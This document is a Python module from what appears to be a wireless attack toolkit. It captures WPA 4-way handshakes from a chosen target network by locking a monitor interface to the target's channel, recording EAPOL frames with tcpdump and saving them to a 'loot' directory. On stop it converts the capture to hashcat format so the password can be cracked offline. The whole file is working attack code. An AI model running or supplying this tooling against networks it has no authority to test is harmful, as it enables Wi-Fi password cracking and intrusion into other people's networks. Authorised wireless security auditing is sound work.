"""handshake.py - Passive WPA 4-way handshake capture.

Uses tcpdump on a monitor interface (no injection needed, so the
mt76 driver's TX-blocking doesn't affect us). Writes a full pcap
to /mmc/root/loot/handshakes/ and runs a second tcpdump filtered
on EAPOL (EtherType 0x888e) to count captured handshakes live.

On stop, the pcap is converted to hashcat's 22000 format with
hcxpcapngtool if available, ready for offline cracking.
"""

import os
import re
import subprocess
import threading
import time
from datetime import datetime


LOOT_DIR = '/mmc/root/loot/handshakes'
_MAC_RE = re.compile(
    r'([0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2})',
    re.IGNORECASE)

_state = {
    'running': False,
    'started_at': None,
    'ssid_count': 0,      # UI parity
    'errors': 0,
    'error_msg': None,
    'frames': 0,          # live EAPOL frame count
    'captures': 0,        # distinct (ap, client) handshake pairs
    'pcap_path': None,
}
_stop_event = None
_pcap_proc = None
_eapol_proc = None
_eapol_thread = None
_seen_pairs = set()


def _run_bg(cmd):
    try:
        return subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
        )
    except Exception as e:
        _state['errors'] += 1
        _state['error_msg'] = f'spawn: {e}'[:120]
        return None


def _iface_exists(name):
    try:
        r = subprocess.run(['iw', 'dev', name, 'info'],
                           capture_output=True, timeout=3)
        return r.returncode == 0
    except Exception:
        return False


def _eapol_loop():
    """Read tcpdump EAPOL output line by line, count frames and
    deduped (ap, client) pairs as a rough handshake counter."""
    global _eapol_proc
    if _eapol_proc is None or _eapol_proc.stdout is None:
        return
    try:
        for line in _eapol_proc.stdout:
            if _stop_event is not None and _stop_event.is_set():
                break
            _state['frames'] += 1
            macs = _MAC_RE.findall(line)
            if len(macs) >= 2:
                pair = tuple(sorted(m.lower() for m in macs[:2]))
                if pair not in _seen_pairs:
                    _seen_pairs.add(pair)
                    _state['captures'] = len(_seen_pairs)
    except Exception:
        pass


def _pick_iface(target):
    """Select the monitor interface whose band matches the target's
    channel. phy0 (wlan0mon) is 2.4GHz-only, phy1 (wlan1mon) handles
    5GHz. If we don't know the target's channel, default to
    wlan0mon since the vast majority of consumer APs run 2.4GHz."""
    ch = None
    if isinstance(target, dict):
        try:
            ch = int(target.get('channel'))
        except (TypeError, ValueError):
            ch = None
    if ch is None:
        return 'wlan0mon'
    if 1 <= ch <= 14:
        return 'wlan0mon'
    return 'wlan1mon'


def start(config):
    global _stop_event, _pcap_proc, _eapol_proc, _eapol_thread

    if _state['running']:
        return True

    target = config.get('wifi_attack_target')
    # Auto-pick the monitor interface for the target's band so
    # we don't miss the handshake because the sniff was on the
    # wrong radio.
    iface = _pick_iface(target)
    if not _iface_exists(iface):
        # Fall back to the user's explicit iface setting if auto
        # pick isn't available (e.g. USB dongle removed).
        iface = config.get('wifi_attack_iface', 'wlan1mon')
    if not _iface_exists(iface):
        _state['errors'] += 1
        _state['error_msg'] = f'{iface} not up'
        return False

    try:
        os.makedirs(LOOT_DIR, exist_ok=True)
    except Exception as e:
        _state['errors'] += 1
        _state['error_msg'] = f'loot dir: {e}'[:120]
        return False

    target = config.get('wifi_attack_target')
    target_bssid = None
    target_ch = None
    if isinstance(target, dict):
        target_bssid = (target.get('bssid') or '').lower() or None
        try:
            target_ch = int(target.get('channel')) if target.get('channel') else None
        except (TypeError, ValueError):
            target_ch = None

    # Lock monitor iface to the target's channel if we have one. Without
    # a lock, the driver may hop and miss the handshake when it happens.
    if target_ch:
        try:
            subprocess.run(['iw', 'dev', iface, 'set', 'channel',
                             str(target_ch)], capture_output=True,
                             timeout=3)
        except Exception:
            pass

    ts = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
    ssid_tag = ''
    if isinstance(target, dict) and target.get('ssid'):
        # Sanitize ssid for filename
        safe = re.sub(r'[^A-Za-z0-9_-]+', '_', target.get('ssid', ''))[:24]
        if safe:
            ssid_tag = '_' + safe
    pcap_path = os.path.join(LOOT_DIR, f'capture{ssid_tag}_{ts}.pcap')

    _state['errors'] = 0
    _state['error_msg'] = None
    _state['frames'] = 0
    _state['captures'] = 0
    _state['pcap_path'] = pcap_path
    _seen_pairs.clear()

    # BPF filter: EAPOL only (and optionally limit to target BSSID so
    # the pcap isn't bloated with unrelated beacons/data frames).
    eapol_filter = 'ether proto 0x888e'
    pcap_filter = None
    if target_bssid:
        pcap_filter = f'ether host {target_bssid}'
        eapol_filter = f'{eapol_filter} and ether host {target_bssid}'

    # Full pcap stream for offline cracking
    pcap_cmd = ['tcpdump', '-i', iface, '-w', pcap_path, '-U']
    if pcap_filter:
        pcap_cmd.append(pcap_filter)
    _pcap_proc = _run_bg(pcap_cmd)
    if _pcap_proc is None:
        return False

    # Live EAPOL watcher for the counter
    _eapol_proc = _run_bg(
        ['tcpdump', '-i', iface, '-e', '-l', eapol_filter])
    if _eapol_proc is None:
        # keep pcap going even if eapol watcher failed
        pass
    else:
        _stop_event = threading.Event()
        _eapol_thread = threading.Thread(target=_eapol_loop, daemon=True)
        _eapol_thread.start()

    _state['running'] = True
    _state['started_at'] = time.time()
    return True


def stop():
    global _stop_event, _pcap_proc, _eapol_proc, _eapol_thread

    if not _state['running']:
        return

    if _stop_event is not None:
        _stop_event.set()

    for proc_ref in ('_pcap_proc', '_eapol_proc'):
        proc = globals().get(proc_ref)
        if proc is not None:
            try:
                proc.terminate()
                try:
                    proc.wait(timeout=1.5)
                except Exception:
                    proc.kill()
            except Exception:
                pass

    if _eapol_thread is not None and _eapol_thread.is_alive():
        _eapol_thread.join(timeout=1.5)

    # Convert pcap to hashcat 22000 if hcxpcapngtool is around
    pcap_path = _state.get('pcap_path')
    if pcap_path and os.path.isfile(pcap_path) and os.path.getsize(pcap_path) > 0:
        out_path = pcap_path.replace('.pcap', '.22000')
        try:
            subprocess.run(
                ['hcxpcapngtool', '-o', out_path, pcap_path],
                capture_output=True, timeout=30,
            )
            if os.path.isfile(out_path) and os.path.getsize(out_path) == 0:
                os.remove(out_path)
        except Exception:
            pass

    _state['running'] = False
    _pcap_proc = None
    _eapol_proc = None
    _eapol_thread = None
    _stop_event = None


def is_running():
    if not _state['running']:
        return False
    # Verify pcap subprocess is still alive — if it crashed, flip
    # the flag so the UI stops claiming RUNNING.
    if _pcap_proc is not None and _pcap_proc.poll() is not None:
        _state['running'] = False
        _state['error_msg'] = 'tcpdump exited'
    return _state['running']


def stats():
    return {
        'running': _state['running'],
        'frames': _state['frames'],
        'captures': _state['captures'],
        'errors': _state['errors'],
        'ssid_count': 0,
        'error_msg': _state.get('error_msg'),
        'pcap_path': _state.get('pcap_path'),
    }
